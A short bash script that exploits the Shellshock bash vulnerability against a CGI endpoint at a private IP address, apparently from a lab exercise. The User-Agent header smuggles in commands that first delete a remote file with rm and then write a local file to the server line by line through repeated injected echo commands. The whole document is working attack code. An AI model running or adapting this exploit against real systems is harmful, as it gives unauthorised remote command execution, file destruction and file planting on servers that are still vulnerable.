#!/bin/bash

STR=""

curl -H "User-Agent: () { :; }; /bin/bash -c 'echo \"Content-type: text/html\r\n\r\n\";echo \"\"; /bin/rm $2 ;'" 192.168.55.216/cgi-bin/test.sh

f=$1 #filename to send as parameter to script
dest=$2 #destination as a parameter to script

while IFS= read line
do
        STR="echo $line >> $dest"
        curl -H "User-Agent: () { :; }; /bin/bash -c 'echo \"Content-type: text/html\r\n\r\n\";echo \"\"; $STR ;'" 192.168.55.216/cgi-bin/test.sh
done < "$f"

#echo $STR

unset STR
unset dest


